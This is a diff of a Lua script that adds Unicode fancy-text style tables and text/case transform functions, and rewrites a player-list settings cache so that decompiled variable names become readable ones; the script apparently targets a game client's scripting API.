+			bold = {"\u{1D5EE}","\u{1D5EF}","\u{1D5F0}","\u{1D5F1}","\u{1D5F2}","\u{1D5F3}","\u{1D5F4}","\u{1D5F5}","\u{1D5F6}","\u{1D5F7}","\u{1D5F8}","\u{1D5F9}","\u{1D5FA}","\u{1D5FB}","\u{1D5FC}","\u{1D5FD}","\u{1D5FE}","\u{1D5FF}","\u{1D600}","\u{1D601}","\u{1D602}","\u{1D603}","\u{1D604}","\u{1D605}","\u{1D606}","\u{1D607}","\u{1D5D4}","\u{1D5D5}","\u{1D5D6}","\u{1D5D7}","\u{1D5D8}","\u{1D5D9}","\u{1D5DA}","\u{1D5DB}","\u{1D5DC}","\u{1D5DD}","\u{1D5DE}","\u{1D5DF}","\u{1D5E0}","\u{1D5E1}","\u{1D5E2}","\u{1D5E3}","\u{1D5E4}","\u{1D5E5}","\u{1D5E6}","\u{1D5E7}","\u{1D5E8}","\u{1D5E9}","\u{1D5EA}","\u{1D5EB}","\u{1D5EC}","\u{1D5ED}","\u{1D7EC}","\u{1D7ED}","\u{1D7EE}","\u{1D7EF}","\u{1D7F0}","\u{1D7F1}","\u{1D7F2}","\u{1D7F3}","\u{1D7F4}","\u{1D7F5}","'"," "},
+			bolditalic = {"\u{1D656}","\u{1D657}","\u{1D658}","\u{1D659}","\u{1D65A}","\u{1D65B}","\u{1D65C}","\u{1D65D}","\u{1D65E}","\u{1D65F}","\u{1D660}","\u{1D661}","\u{1D662}","\u{1D663}","\u{1D664}","\u{1D665}","\u{1D666}","\u{1D667}","\u{1D668}","\u{1D669}","\u{1D66A}","\u{1D66B}","\u{1D66C}","\u{1D66D}","\u{1D66E}","\u{1D66F}", "\u{1D63C}","\u{1D63D}","\u{1D63E}","\u{1D63F}","\u{1D640}","\u{1D641}","\u{1D642}","\u{1D643}","\u{1D644}","\u{1D645}","\u{1D646}","\u{1D647}","\u{1D648}","\u{1D649}","\u{1D64A}","\u{1D64B}","\u{1D64C}","\u{1D64D}","\u{1D64E}","\u{1D64F}","\u{1D650}","\u{1D651}","\u{1D652}","\u{1D653}","\u{1D654}","\u{1D655}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			italic = {"\u{1D622}","\u{1D623}","\u{1D624}","\u{1D625}","\u{1D626}","\u{1D627}","\u{1D628}","\u{1D629}","\u{1D62A}","\u{1D62B}","\u{1D62C}","\u{1D62D}","\u{1D62E}","\u{1D62F}","\u{1D630}","\u{1D631}","\u{1D632}","\u{1D633}","\u{1D634}","\u{1D635}","\u{1D636}","\u{1D637}","\u{1D638}","\u{1D639}","\u{1D63A}","\u{1D63B}", "\u{1D608}","\u{1D609}","\u{1D60A}","\u{1D60B}","\u{1D60C}","\u{1D60D}","\u{1D60E}","\u{1D60F}","\u{1D610}","\u{1D611}","\u{1D612}","\u{1D613}","\u{1D614}","\u{1D615}","\u{1D616}","\u{1D617}","\u{1D618}","\u{1D619}","\u{1D61A}","\u{1D61B}","\u{1D61C}","\u{1D61D}","\u{1D61E}","\u{1D61F}","\u{1D620}","\u{1D621}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			circled = {"\u{24D0}","\u{24D1}","\u{24D2}","\u{24D3}","\u{24D4}","\u{24D5}","\u{24D6}","\u{24D7}","\u{24D8}","\u{24D9}","\u{24DA}","\u{24DB}","\u{24DC}","\u{24DD}","\u{24DE}","\u{24DF}","\u{24E0}","\u{24E1}","\u{24E2}","\u{24E3}","\u{24E4}","\u{24E5}","\u{24E6}","\u{24E7}","\u{24E8}","\u{24E9}", "\u{24B6}","\u{24B7}","\u{24B8}","\u{24B9}","\u{24BA}","\u{24BB}","\u{24BC}","\u{24BD}","\u{24BE}","\u{24BF}","\u{24C0}","\u{24C1}","\u{24C2}","\u{24C3}","\u{24C4}","\u{24C5}","\u{24C6}","\u{24C7}","\u{24C8}","\u{24C9}","\u{24CA}","\u{24CB}","\u{24CC}","\u{24CD}","\u{24CE}","\u{24CF}", "0","\u{2460}","\u{2461}","\u{2462}","\u{2463}","\u{2464}","\u{2465}","\u{2466}","\u{2467}","\u{2468}","'"," "},
+			circledNeg = {"\u{1F150}","\u{1F151}","\u{1F152}","\u{1F153}","\u{1F154}","\u{1F155}","\u{1F156}","\u{1F157}","\u{1F158}","\u{1F159}","\u{1F15A}","\u{1F15B}","\u{1F15C}","\u{1F15D}","\u{1F15E}","\u{1F15F}","\u{1F160}","\u{1F161}","\u{1F162}","\u{1F163}","\u{1F164}","\u{1F165}","\u{1F166}","\u{1F167}","\u{1F168}","\u{1F169}", "\u{1F150}","\u{1F151}","\u{1F152}","\u{1F153}","\u{1F154}","\u{1F155}","\u{1F156}","\u{1F157}","\u{1F158}","\u{1F159}","\u{1F15A}","\u{1F15B}","\u{1F15C}","\u{1F15D}","\u{1F15E}","\u{1F15F}","\u{1F160}","\u{1F161}","\u{1F162}","\u{1F163}","\u{1F164}","\u{1F165}","\u{1F166}","\u{1F167}","\u{1F168}","\u{1F169}", "\u{24FF}","1","2","3","4","5","6","7","8","9","'"," "},
+			fullwidth = {"\u{FF41}","\u{FF42}","\u{FF43}","\u{FF44}","\u{FF45}","\u{FF46}","\u{FF47}","\u{FF48}","\u{FF49}","\u{FF4A}","\u{FF4B}","\u{FF4C}","\u{FF4D}","\u{FF4E}","\u{FF4F}","\u{FF50}","\u{FF51}","\u{FF52}","\u{FF53}","\u{FF54}","\u{FF55}","\u{FF56}","\u{FF57}","\u{FF58}","\u{FF59}","\u{FF5A}", "\u{FF21}","\u{FF22}","\u{FF23}","\u{FF24}","\u{FF25}","\u{FF26}","\u{FF27}","\u{FF28}","\u{FF29}","\u{FF2A}","\u{FF2B}","\u{FF2C}","\u{FF2D}","\u{FF2E}","\u{FF2F}","\u{FF30}","\u{FF31}","\u{FF32}","\u{FF33}","\u{FF34}","\u{FF35}","\u{FF36}","\u{FF37}","\u{FF38}","\u{FF39}","\u{FF3A}", "\u{FF10}","\u{FF11}","\u{FF12}","\u{FF13}","\u{FF14}","\u{FF15}","\u{FF16}","\u{FF17}","\u{FF18}","\u{FF19}","\u{FF07}","\u{3000}"},
+			fraktur = {"\u{1D51E}","\u{1D51F}","\u{1D520}","\u{1D521}","\u{1D522}","\u{1D523}","\u{1D524}","\u{1D525}","\u{1D526}","\u{1D527}","\u{1D528}","\u{1D529}","\u{1D52A}","\u{1D52B}","\u{1D52C}","\u{1D52D}","\u{1D52E}","\u{1D52F}","\u{1D530}","\u{1D531}","\u{1D532}","\u{1D533}","\u{1D534}","\u{1D535}","\u{1D536}","\u{1D537}", "\u{1D504}","\u{1D505}","\u{212D}","\u{1D507}","\u{1D508}","\u{1D509}","\u{1D50A}","\u{210C}","\u{2111}","\u{1D50D}","\u{1D50E}","\u{1D50F}","\u{1D510}","\u{1D511}","\u{1D512}","\u{1D513}","\u{1D514}","\u{211C}","\u{1D516}","\u{1D517}","\u{1D518}","\u{1D519}","\u{1D51A}","\u{1D51B}","\u{1D51C}","\u{2128}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			frakturbold = {"\u{1D586}","\u{1D587}","\u{1D588}","\u{1D589}","\u{1D58A}","\u{1D58B}","\u{1D58C}","\u{1D58D}","\u{1D58E}","\u{1D58F}","\u{1D590}","\u{1D591}","\u{1D592}","\u{1D593}","\u{1D594}","\u{1D595}","\u{1D596}","\u{1D597}","\u{1D598}","\u{1D599}","\u{1D59A}","\u{1D59B}","\u{1D59C}","\u{1D59D}","\u{1D59E}","\u{1D59F}", "\u{1D56C}","\u{1D56D}","\u{1D56E}","\u{1D56F}","\u{1D570}","\u{1D571}","\u{1D572}","\u{1D573}","\u{1D574}","\u{1D575}","\u{1D576}","\u{1D577}","\u{1D578}","\u{1D579}","\u{1D57A}","\u{1D57B}","\u{1D57C}","\u{1D57D}","\u{1D57E}","\u{1D57F}","\u{1D580}","\u{1D581}","\u{1D582}","\u{1D583}","\u{1D584}","\u{1D585}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			script = {"\u{1D4EA}","\u{1D4EB}","\u{1D4EC}","\u{1D4ED}","\u{1D4EE}","\u{1D4EF}","\u{1D4F0}","\u{1D4F1}","\u{1D4F2}","\u{1D4F3}","\u{1D4F4}","\u{1D4F5}","\u{1D4F6}","\u{1D4F7}","\u{1D4F8}","\u{1D4F9}","\u{1D4FA}","\u{1D4FB}","\u{1D4FC}","\u{1D4FD}","\u{1D4FE}","\u{1D4FF}","\u{1D500}","\u{1D501}","\u{1D502}","\u{1D503}", "\u{1D4D0}","\u{1D4D1}","\u{1D4D2}","\u{1D4D3}","\u{1D4D4}","\u{1D4D5}","\u{1D4D6}","\u{1D4D7}","\u{1D4D8}","\u{1D4D9}","\u{1D4DA}","\u{1D4DB}","\u{1D4DC}","\u{1D4DD}","\u{1D4DE}","\u{1D4DF}","\u{1D4E0}","\u{1D4E1}","\u{1D4E2}","\u{1D4E3}","\u{1D4E4}","\u{1D4E5}","\u{1D4E6}","\u{1D4E7}","\u{1D4E8}","\u{1D4E9}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			doublestruck = {"\u{1D552}","\u{1D553}","\u{1D554}","\u{1D555}","\u{1D556}","\u{1D557}","\u{1D558}","\u{1D559}","\u{1D55A}","\u{1D55B}","\u{1D55C}","\u{1D55D}","\u{1D55E}","\u{1D55F}","\u{1D560}","\u{1D561}","\u{1D562}","\u{1D563}","\u{1D564}","\u{1D565}","\u{1D566}","\u{1D567}","\u{1D568}","\u{1D569}","\u{1D56A}","\u{1D56B}", "\u{1D538}","\u{1D539}","\u{2102}","\u{1D53B}","\u{1D53C}","\u{1D53D}","\u{1D53E}","\u{210D}","\u{1D540}","\u{1D541}","\u{1D542}","\u{1D543}","\u{1D544}","\u{2115}","\u{1D546}","\u{2119}","\u{211A}","\u{211D}","\u{1D54A}","\u{1D54B}","\u{1D54C}","\u{1D54D}","\u{1D54E}","\u{1D54F}","\u{1D550}","\u{2124}", "\u{1D7D8}","\u{1D7D9}","\u{1D7DA}","\u{1D7DB}","\u{1D7DC}","\u{1D7DD}","\u{1D7DE}","\u{1D7DF}","\u{1D7E0}","\u{1D7E1}","'"," "},
+			monospace = {"\u{1D68A}","\u{1D68B}","\u{1D68C}","\u{1D68D}","\u{1D68E}","\u{1D68F}","\u{1D690}","\u{1D691}","\u{1D692}","\u{1D693}","\u{1D694}","\u{1D695}","\u{1D696}","\u{1D697}","\u{1D698}","\u{1D699}","\u{1D69A}","\u{1D69B}","\u{1D69C}","\u{1D69D}","\u{1D69E}","\u{1D69F}","\u{1D6A0}","\u{1D6A1}","\u{1D6A2}","\u{1D6A3}", "\u{1D670}","\u{1D671}","\u{1D672}","\u{1D673}","\u{1D674}","\u{1D675}","\u{1D676}","\u{1D677}","\u{1D678}","\u{1D679}","\u{1D67A}","\u{1D67B}","\u{1D67C}","\u{1D67D}","\u{1D67E}","\u{1D67F}","\u{1D680}","\u{1D681}","\u{1D682}","\u{1D683}","\u{1D684}","\u{1D685}","\u{1D686}","\u{1D687}","\u{1D688}","\u{1D689}", "\u{1D7F6}","\u{1D7F7}","\u{1D7F8}","\u{1D7F9}","\u{1D7FA}","\u{1D7FB}","\u{1D7FC}","\u{1D7FD}","\u{1D7FE}","\u{1D7FF}","'"," "},
+			parenthesized = {"\u{249C}","\u{249D}","\u{249E}","\u{249F}","\u{24A0}","\u{24A1}","\u{24A2}","\u{24A3}","\u{24A4}","\u{24A5}","\u{24A6}","\u{24A7}","\u{24A8}","\u{24A9}","\u{24AA}","\u{24AB}","\u{24AC}","\u{24AD}","\u{24AE}","\u{24AF}","\u{24B0}","\u{24B1}","\u{24B2}","\u{24B3}","\u{24B4}","\u{24B5}", "\u{249C}","\u{249D}","\u{249E}","\u{249F}","\u{24A0}","\u{24A1}","\u{24A2}","\u{24A3}","\u{24A4}","\u{24A5}","\u{24A6}","\u{24A7}","\u{24A8}","\u{24A9}","\u{24AA}","\u{24AB}","\u{24AC}","\u{24AD}","\u{24AE}","\u{24AF}","\u{24B0}","\u{24B1}","\u{24B2}","\u{24B3}","\u{24B4}","\u{24B5}", "0","\u{2474}","\u{2475}","\u{2476}","\u{2477}","\u{2478}","\u{2479}","\u{247A}","\u{247B}","\u{247C}","'"," "},
+			regional = {"\u{1F1E6}","\u{1F1E7}","\u{1F1E8}","\u{1F1E9}","\u{1F1EA}","\u{1F1EB}","\u{1F1EC}","\u{1F1ED}","\u{1F1EE}","\u{1F1EF}","\u{1F1F0}","\u{1F1F1}","\u{1F1F2}","\u{1F1F3}","\u{1F1F4}","\u{1F1F5}","\u{1F1F6}","\u{1F1F7}","\u{1F1F8}","\u{1F1F9}","\u{1F1FA}","\u{1F1FB}","\u{1F1FC}","\u{1F1FD}","\u{1F1FE}","\u{1F1FF}", "\u{1F1E6}","\u{1F1E7}","\u{1F1E8}","\u{1F1E9}","\u{1F1EA}","\u{1F1EB}","\u{1F1EC}","\u{1F1ED}","\u{1F1EE}","\u{1F1EF}","\u{1F1F0}","\u{1F1F1}","\u{1F1F2}","\u{1F1F3}","\u{1F1F4}","\u{1F1F5}","\u{1F1F6}","\u{1F1F7}","\u{1F1F8}","\u{1F1F9}","\u{1F1FA}","\u{1F1FB}","\u{1F1FC}","\u{1F1FD}","\u{1F1FE}","\u{1F1FF}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			squared = {"\u{1F130}","\u{1F131}","\u{1F132}","\u{1F133}","\u{1F134}","\u{1F135}","\u{1F136}","\u{1F137}","\u{1F138}","\u{1F139}","\u{1F13A}","\u{1F13B}","\u{1F13C}","\u{1F13D}","\u{1F13E}","\u{1F13F}","\u{1F140}","\u{1F141}","\u{1F142}","\u{1F143}","\u{1F144}","\u{1F145}","\u{1F146}","\u{1F147}","\u{1F148}","\u{1F149}", "\u{1F130}","\u{1F131}","\u{1F132}","\u{1F133}","\u{1F134}","\u{1F135}","\u{1F136}","\u{1F137}","\u{1F138}","\u{1F139}","\u{1F13A}","\u{1F13B}","\u{1F13C}","\u{1F13D}","\u{1F13E}","\u{1F13F}","\u{1F140}","\u{1F141}","\u{1F142}","\u{1F143}","\u{1F144}","\u{1F145}","\u{1F146}","\u{1F147}","\u{1F148}","\u{1F149}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			squaredNeg = {"\u{1F170}","\u{1F171}","\u{1F172}","\u{1F173}","\u{1F174}","\u{1F175}","\u{1F176}","\u{1F177}","\u{1F178}","\u{1F179}","\u{1F17A}","\u{1F17B}","\u{1F17C}","\u{1F17D}","\u{1F17E}","\u{1F17F}","\u{1F180}","\u{1F181}","\u{1F182}","\u{1F183}","\u{1F184}","\u{1F185}","\u{1F186}","\u{1F187}","\u{1F188}","\u{1F189}", "\u{1F170}","\u{1F171}","\u{1F172}","\u{1F173}","\u{1F174}","\u{1F175}","\u{1F176}","\u{1F177}","\u{1F178}","\u{1F179}","\u{1F17A}","\u{1F17B}","\u{1F17C}","\u{1F17D}","\u{1F17E}","\u{1F17F}","\u{1F180}","\u{1F181}","\u{1F182}","\u{1F183}","\u{1F184}","\u{1F185}","\u{1F186}","\u{1F187}","\u{1F188}","\u{1F189}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			acute = {"\u{E1}","b","\u{107}","d","\u{E9}","f","\u{1F5}","h","\u{ED}","j","\u{1E31}","\u{13A}","\u{1E3F}","\u{144}","\u{151}","\u{1E55}","q","\u{155}","\u{15B}","t","\u{FA}","v","\u{1E83}","x","\u{4F3}","\u{17A}", "\u{C1}","B","\u{106}","D","\u{C9}","F","\u{1F4}","H","\u{ED}","J","\u{1E30}","\u{139}","\u{1E3E}","\u{143}","\u{150}","\u{1E54}","Q","\u{154}","\u{15B}","T","\u{170}","V","\u{1E82}","X","\u{4F2}","\u{179}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			thai = {"\u{FF91}","\u{4E43}","c","d","\u{4E47}","\u{FF77}","g","\u{3093}","\u{FF89}","\u{FF8C}","\u{30BA}","\u{FF9A}","\u{FFB6}","\u{5200}","o","\u{FF71}","q","\u{5C3A}","\u{4E02}","\u{FF72}","u","\u{221A}","w","\u{FF92}","\u{FF98}","\u{4E59}", "\u{FF91}","\u{4E43}","c","d","\u{4E47}","\u{FF77}","g","\u{3093}","\u{FF89}","\u{FF8C}","\u{30BA}","\u{FF9A}","\u{FFB6}","\u{5200}","o","\u{FF71}","q","\u{5C3A}","\u{4E02}","\u{FF72}","u","\u{221A}","w","\u{FF92}","\u{FF98}","\u{4E59}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			curvy1 = {"\u{E04}","\u{E52}","\u{188}","\u{257}","\u{FEC9}","\u{93F}","\u{FEED}","\u{266}","\u{671}","\u{FEDD}","\u{16D5}","\u{26D}","\u{E53}","\u{E01}","\u{47B}","\u{3C1}","\u{6F9}","\u{27C}","\u{E23}","\u{547}","\u{AAA}","\u{6F7}","\u{E1D}","\u{E0B}","\u{5E5}","\u{579}", "\u{E04}","\u{E52}","\u{188}","\u{257}","\u{FEC9}","\u{93F}","\u{FEED}","\u{266}","\u{671}","\u{FEDD}","\u{16D5}","\u{26D}","\u{E53}","\u{E01}","\u{47B}","\u{3C1}","\u{6F9}","\u{27C}","\u{E23}","\u{547}","\u{AAA}","\u{6F7}","\u{E1D}","\u{E0B}","\u{5E5}","\u{579}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			curvy2 = {"\u{3B1}","\u{432}","\u{A2}","\u{2202}","\u{454}","\u{192}","\u{FEED}","\u{43D}","\u{3B9}","\u{5E0}","\u{43A}","\u{2113}","\u{43C}","\u{3B7}","\u{3C3}","\u{3C1}","\u{6F9}","\u{44F}","\u{455}","\u{442}","\u{3C5}","\u{3BD}","\u{3C9}","\u{3C7}","\u{443}","\u{579}", "\u{3B1}","\u{432}","\u{A2}","\u{2202}","\u{454}","\u{192}","\u{FEED}","\u{43D}","\u{3B9}","\u{5E0}","\u{43A}","\u{2113}","\u{43C}","\u{3B7}","\u{3C3}","\u{3C1}","\u{6F9}","\u{44F}","\u{455}","\u{442}","\u{3C5}","\u{3BD}","\u{3C9}","\u{3C7}","\u{443}","\u{579}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			curvy3 = {"\u{E04}","\u{E52}","\u{3C2}","\u{E54}","\u{454}","\u{166}","\u{FEEE}","\u{452}","\u{E40}","\u{5DF}","\u{43A}","\u{26D}","\u{E53}","\u{E20}","\u{E4F}","\u{5E7}","\u{1EE3}","\u{433}","\u{E23}","\u{547}","\u{E22}","\u{5E9}","\u{E2C}","\u{5D0}","\u{5E5}","\u{579}", "\u{E04}","\u{E52}","\u{3C2}","\u{E54}","\u{454}","\u{166}","\u{FEEE}","\u{452}","\u{E40}","\u{5DF}","\u{43A}","\u{26D}","\u{E53}","\u{E20}","\u{E4F}","\u{5E7}","\u{1EE3}","\u{433}","\u{E23}","\u{547}","\u{E22}","\u{5E9}","\u{E2C}","\u{5D0}","\u{5E5}","\u{579}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			fauxcryllic = {"\u{430}","\u{44A}","\u{441}","\u{2181}","\u{44D}","f","\u{411}","\u{402}","\u{456}","\u{458}","\u{43A}","l","\u{43C}","\u{438}","\u{43E}","\u{440}","q","\u{453}","\u{455}","\u{442}","\u{446}","v","\u{448}","\u{445}","\u{40E}","z", "\u{414}","\u{411}","\u{480}","\u{2181}","\u{404}","F","\u{411}","\u{41D}","\u{406}","\u{408}","\u{40C}","L","\u{41C}","\u{418}","\u{424}","\u{420}","Q","\u{42F}","\u{405}","\u{413}","\u{426}","V","\u{429}","\u{416}","\u{427}","Z", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			rockdots = {"\u{E4}","\u{1E05}","\u{10B}","\u{1E0B}","\u{EB}","\u{1E1F}","\u{121}","\u{1E27}","\u{EF}","j","\u{1E33}","\u{1E37}","\u{1E41}","\u{1E45}","\u{F6}","\u{1E57}","q","\u{1E5B}","\u{1E61}","\u{1E97}","\u{FC}","\u{1E7F}","\u{1E85}","\u{1E8D}","\u{FF}","\u{17C}", "\u{C4}","\u{1E04}","\u{10A}","\u{1E0A}","\u{401}","\u{1E1E}","\u{120}","\u{1E26}","\u{407}","J","\u{1E32}","\u{1E36}","\u{1E40}","\u{1E44}","\u{D6}","\u{1E56}","Q","\u{1E5A}","\u{1E60}","\u{1E6A}","\u{DC}","\u{1E7E}","\u{1E84}","\u{1E8C}","\u{178}","\u{17B}", "0","1","2","\u{4DF}","4","5","6","7","8","9","'"," "},
+			smallcaps = {"\u{1D00}","\u{299}","\u{1D04}","\u{1D05}","\u{1D07}","\u{A730}","\u{262}","\u{29C}","\u{26A}","\u{1D0A}","\u{1D0B}","\u{29F}","\u{1D0D}","\u{274}","\u{1D0F}","\u{1D29}","q","\u{280}","\u{A731}","\u{1D1B}","\u{1D1C}","\u{1D20}","\u{1D21}","x","y","\u{1D22}", "\u{1D00}","\u{299}","\u{1D04}","\u{1D05}","\u{1D07}","\u{A730}","\u{262}","\u{29C}","\u{26A}","\u{1D0A}","\u{1D0B}","\u{29F}","\u{1D0D}","\u{274}","\u{1D0F}","\u{1D29}","Q","\u{280}","\u{A731}","\u{1D1B}","\u{1D1C}","\u{1D20}","\u{1D21}","x","Y","\u{1D22}", "0","1","2","3","4","5","6","7","8","9","'"," "},
+			stroked = {"\u{23A}","\u{180}","\u{23C}","\u{111}","\u{247}","f","\u{1E5}","\u{127}","\u{268}","\u{249}","\u{A741}","\u{142}","m","n","\u{F8}","\u{1D7D}","\u{A757}","\u{24D}","s","\u{167}","\u{1D7E}","v","w","x","\u{24F}","\u{1B6}", "\u{23A}","\u{243}","\u{23B}","\u{110}","\u{246}","F","\u{1E4}","\u{126}","\u{197}","\u{248}","\u{A740}","\u{141}","M","N","\u{D8}","\u{2C63}","\u{A756}","\u{24C}","S","\u{166}","\u{1D7E}","V","W","X","\u{24E}","\u{1B5}", "0","1","\u{1BB}","3","4","5","6","7","8","9","'"," "},
+			subscript = {"\u{2090}","b","c","d","\u{2091}","f","g","\u{2095}","\u{1D62}","\u{2C7C}","\u{2096}","\u{2097}","\u{2098}","\u{2099}","\u{2092}","\u{209A}","q","\u{1D63}","\u{209B}","\u{209C}","\u{1D64}","\u{1D65}","w","\u{2093}","y","z", "\u{2090}","B","C","D","\u{2091}","F","G","\u{2095}","\u{1D62}","\u{2C7C}","\u{2096}","\u{2097}","\u{2098}","\u{2099}","\u{2092}","\u{209A}","Q","\u{1D63}","\u{209B}","\u{209C}","\u{1D64}","\u{1D65}","W","\u{2093}","Y","Z", "\u{2080}","\u{2081}","\u{2082}","\u{2083}","\u{2084}","\u{2085}","\u{2086}","\u{2087}","\u{2088}","\u{2089}","'"," "},
+			superscript = {"\u{1D43}","\u{1D47}","\u{1D9C}","\u{1D48}","\u{1D49}","\u{1DA0}","\u{1D4D}","\u{2B0}","\u{2071}","\u{2B2}","\u{1D4F}","\u{2E1}","\u{1D50}","\u{207F}","\u{1D52}","\u{1D56}","q","\u{2B3}","\u{2E2}","\u{1D57}","\u{1D58}","\u{1D5B}","\u{2B7}","\u{2E3}","\u{2B8}","\u{1DBB}", "\u{1D2C}","\u{1D2E}","\u{1D9C}","\u{1D30}","\u{1D31}","\u{1DA0}","\u{1D33}","\u{1D34}","\u{1D35}","\u{1D36}","\u{1D37}","\u{1D38}","\u{1D39}","\u{1D3A}","\u{1D3C}","\u{1D3E}","Q","\u{1D3F}","\u{2E2}","\u{1D40}","\u{1D41}","\u{2C7D}","\u{1D42}","\u{2E3}","\u{2B8}","\u{1DBB}", "\u{2070}","\u{B9}","\u{B2}","\u{B3}","\u{2074}","\u{2075}","\u{2076}","\u{2077}","\u{2078}","\u{2079}","'"," "},
+			inverted = {"\u{250}","q","\u{254}","p","\u{1DD}","\u{25F}","\u{183}","\u{265}","\u{131}","\u{27E}","\u{29E}","\u{5DF}","\u{26F}","u","o","d","b","\u{279}","s","\u{287}","n","\u{28C}","\u{28D}","x","\u{28E}","z", "\u{250}","q","\u{254}","p","\u{1DD}","\u{25F}","\u{183}","\u{265}","\u{131}","\u{27E}","\u{29E}","\u{5DF}","\u{26F}","u","o","d","b","\u{279}","s","\u{287}","n","\u{10321}","\u{28D}","x","\u{28E}","z", "0","1","2","3","4","5","6","7","8","9",","," "},
 		}
 	}
 
-	function transText(arg_203_0, arg_203_1)
-		if not var_10_42.trans[arg_203_0] then
-			return arg_203_1
+	function transText(types, text)
+		if not style.trans[types] then return text end
+		local output = ''
+		for i=1, #text do
+			local char = text:sub(i,i)
+			output = output .. ( style.trans[types][style.letters:find(char)] or char )
 		end
-
-		local var_203_0 = ""
-
-		for iter_203_0 = 1, #arg_203_1 do
-			local var_203_1 = arg_203_1:sub(iter_203_0, iter_203_0)
-
-			var_203_0 = var_203_0 .. (var_10_42.trans[arg_203_0][var_10_42.letters:find(var_203_1)] or var_203_1)
-		end
-
-		return var_203_0
+		return output
 	end
 
-	function changeCaseWord(arg_204_0)
-		local var_204_0 = ""
-
-		for iter_204_0 = 1, #arg_204_0 do
-			if iter_204_0 % 2 == 1 then
-				var_204_0 = var_204_0 .. string.upper(arg_204_0:sub(iter_204_0, iter_204_0))
+	function changeCaseWord(str)
+		local u = ""
+		for i = 1, #str do
+			if i % 2 == 1 then
+				u = u .. string.upper(str:sub(i, i))
 			else
-				var_204_0 = var_204_0 .. string.lower(arg_204_0:sub(iter_204_0, iter_204_0))
+				u = u .. string.lower(str:sub(i, i))
 			end
 		end
-
-		return var_204_0
+		return u
 	end
 
-	function changeCase(arg_205_0)
-		local var_205_0 = {}
-
-		for iter_205_0 in arg_205_0:gmatch(".+") do
-			var_205_0[#var_205_0 + 1] = iter_205_0
+	function changeCase(original)
+		local words = {}
+		for v in original:gmatch(".+") do 
+			words[#words + 1] = v
 		end
-
-		for iter_205_1, iter_205_2 in ipairs(var_205_0) do
-			var_205_0[iter_205_1] = changeCaseWord(iter_205_2)
+		for i,v in ipairs(words) do
+			words[i] = changeCaseWord(v)
 		end
-
-		return table.concat(var_205_0, " ")
+		return table.concat(words, " ")
 	end
 
-	if var_0_18.get("Playerlist Additions") then
-		local var_10_43 = ui.reference("Players", "Players", "Player list")
-		local var_10_44 = ui.reference("Players", "Players", "Reset all")
-		local var_10_45 = ui.reference("Players", "Adjustments", "Apply to all")
+	-- UI References
+	if ( Feature.get('Playerlist Additions') ) then
+		local PlayerList = ui.reference('Players', 'Players', 'Player list')
+		local ResetAll = ui.reference('Players', 'Players', 'Reset all')
+		local ApplyToAll = ui.reference('Players', 'Adjustments', 'Apply to all')
 
-		var_0_21.binds = {}
-		var_0_21.defaultValues = {}
-		var_0_21.cache = {}
+		-- Internal Libary
+		PListAdditions.binds = {}
+		PListAdditions.defaultValues = {}
+		PListAdditions.cache = {}
 
-		function var_0_21.getPlayer()
-			return ui.get(var_10_43)
+		PListAdditions.getPlayer = function()
+			return ui.get(PlayerList)
 		end
 
-		function var_0_21.bind(arg_207_0, arg_207_1)
-			var_0_21.binds[#var_0_21.binds + 1] = arg_207_0
-			var_0_21.defaultValues[arg_207_0] = ui.get(arg_207_0)
-
-			ui.set_callback(arg_207_0, function(arg_208_0)
-				if arg_207_1 then
-					arg_207_1(arg_208_0)
+		PListAdditions.bind = function(MenuItem, Callback)
+			PListAdditions.binds[#PListAdditions.binds + 1 ] = MenuItem
+			PListAdditions.defaultValues[MenuItem] = ui.get(MenuItem)
+			ui.set_callback(MenuItem, function(item)
+				if ( Callback ) then
+					Callback(item)
 				end
-
-				local var_208_0 = var_0_21.getPlayer()
-
-				printDebug("callbacks, ", var_208_0)
-
-				if var_208_0 then
-					var_0_21.cache[var_208_0] = var_0_21.cache[var_208_0] or {}
-					var_0_21.cache[var_208_0][arg_208_0] = ui.get(arg_208_0)
-
-					printDebug(var_208_0, " = ", arg_208_0, ", ", ui.get(arg_208_0))
+				local Player = PListAdditions.getPlayer()
+				printDebug('callbacks, ', Player)
+				if ( Player ) then
+					PListAdditions.cache[Player] = PListAdditions.cache[Player] or {}
+					PListAdditions.cache[Player][item] = ui.get(item)
+					printDebug(Player, ' = ', item, ', ', ui.get(item))
 				end
 			end)
 		end
 
-		ui.set_callback(var_10_43, function(arg_209_0)
-			local var_209_0 = ui.get(arg_209_0)
+		ui.set_callback(PlayerList, function(item)
+			local Player = ui.get(item)
+			if ( Player ) then
+				PListAdditions.cache[Player] = PListAdditions.cache[Player] or {}
 
-			if var_209_0 then
-				var_0_21.cache[var_209_0] = var_0_21.cache[var_209_0] or {}
-
-				for iter_209_0, iter_209_1 in ipairs(var_0_21.binds) do
-					local var_209_1 = var_0_21.cache[var_209_0][iter_209_1]
-
-					printDebug(iter_209_1, var_209_1)
-
-					if var_209_1 == nil then
-						var_209_1 = var_0_21.defaultValues[iter_209_1]
+				for index, BindedItem in ipairs(PListAdditions.binds) do
+					local Value = PListAdditions.cache[Player][BindedItem]
+					printDebug(BindedItem, Value)
+					if ( Value == nil ) then
+						Value = PListAdditions.defaultValues[BindedItem]
 					end
-
-					if var_209_1 ~= nil then
-						ui.set(iter_209_1, var_209_1)
+					if ( Value ~= nil ) then
+						ui.set(BindedItem, Value)
 					end
 				end
 			end
 		end)
-		ui.set_callback(var_10_44, function(arg_210_0)
-			for iter_210_0, iter_210_1 in pairs(var_0_21.cache) do
-				for iter_210_2, iter_210_3 in pairs(iter_210_1) do
-					ui.set(iter_210_2, var_0_21.defaultValues[iter_210_2])
+
+		ui.set_callback(ResetAll, function(self)
+			for PlayerIndex, SubItems in pairs(PListAdditions.cache) do
+				for ItemIndex, ItemValue in pairs(SubItems) do
+					ui.set(ItemIndex, PListAdditions.defaultValues[ItemIndex])
 				end
 			end
-
-			var_0_21.cache = {}
+			
+			PListAdditions.cache = {}
 		end)
-		ui.set_callback(var_10_45, function(arg_211_0)
